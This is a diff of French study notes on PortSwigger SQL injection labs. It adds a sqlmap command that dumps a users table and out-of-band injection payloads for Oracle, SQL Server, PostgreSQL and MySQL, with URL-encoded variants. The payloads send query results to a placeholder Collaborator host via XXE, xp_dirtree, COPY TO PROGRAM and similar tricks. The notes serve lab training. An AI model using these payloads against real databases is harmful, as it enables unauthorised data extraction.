@@ -82,11 +82,44 @@
     
     Ca marche mais l'exercice veut un delay de 10sec pour une base postgresql : `TrackingId=33iPOvvWyVfcT3Di' || pg_sleep(10)--`
 
-- [ ] Blind SQL injection with time delays and information retrieval
+- [X] Blind SQL injection with time delays and information retrieval
 
+    `sqlmap -u https://0a350086042c640081e0d44d00c70068.web-security-academy.net/ --level 3 --cookie='TrackingId=oCa0SUxSuv7kOdtU; session=DMHLaGLDeWDTGZwbjdwQ2PieyYmuEUUg' --param-filter='COOKIE' -D public -T users --dump`
+
+
+- [X] Blind SQL injection with out-of-band interaction
+
+    Il faut BurpSuite Professional
     
-
-- [ ] Blind SQL injection with out-of-band interaction
+    On active le "Collaborator"
+    
+    Payload : 
+    
+        ```Oracle 	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://LINK-COLLABORATOR/"> %remote;]>'),'/l') FROM dual
+            Microsoft 	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+            PostgreSQL 	create OR replace function f() returns void as $$
+            declare c text;
+            declare p text;
+            begin
+            SELECT into p (SELECT YOUR-QUERY-HERE);
+            c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+            execute c;
+            END;
+            $$ language plpgsql security definer;
+            SELECT f();
+            MySQL 	The following technique works on Windows only:
+            SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+        ```
+        
+    On colle le lien "Collaborator" :
+    
+    ``` '|| (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://LINK-COLLABORATOR/"> %remote;]>'),'/l') FROM dual)--```
+    
+    On encore URL
+    
+    ```
+    '||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//LINK-COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual)--
+    ```
 
 - [ ] Blind SQL injection with out-of-band data exfiltration
 
